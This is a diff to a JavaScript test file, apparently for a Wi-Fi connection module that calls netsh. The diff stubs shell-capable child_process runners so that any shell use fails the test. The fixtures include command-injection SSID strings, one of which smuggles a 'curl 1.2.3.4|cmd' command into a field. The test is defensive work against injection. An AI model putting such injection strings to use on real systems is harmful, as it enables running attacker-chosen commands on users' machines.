@@ -11,9 +11,18 @@ const INJECTING_SSID = 'x"&curl 1.2.3.4|cmd&"'
 const CMD_SYNTAX_SSID = 'a&calc|b^c>d%PATH%'
 const PASSWORD = 'p&ss<wo>rd"\''
 const UNESCAPED_AMPERSAND = /&(?!amp;|lt;|gt;|quot;|apos;)/
+const SHELL_CAPABLE_RUNNERS = ['exec', 'execSync', 'execFileSync', 'spawn', 'spawnSync']
 
 const calls = []
+const shellCapableRunnerCalls = []
 let netsh = () => null
+
+for (const runner of SHELL_CAPABLE_RUNNERS) {
+  childProcess[runner] = () => {
+    shellCapableRunnerCalls.push(runner)
+    throw new Error(`child_process.${runner} must not run in this test`)
+  }
+}
 
 childProcess.execFile = (file, args, options, callback) => {
   const call = { file, args, options }
@@ -42,8 +51,10 @@ afterEach(() => {
   for (const call of calls) {
     if (call.profilePath) fs.rmSync(path.dirname(call.profilePath), { recursive: true, force: true })
   }
+  const runnersCalled = shellCapableRunnerCalls.splice(0)
   calls.length = 0
   netsh = () => null
+  expect(runnersCalled).toEqual([])
 })
 
 describe('isConnectableSsid', () => {
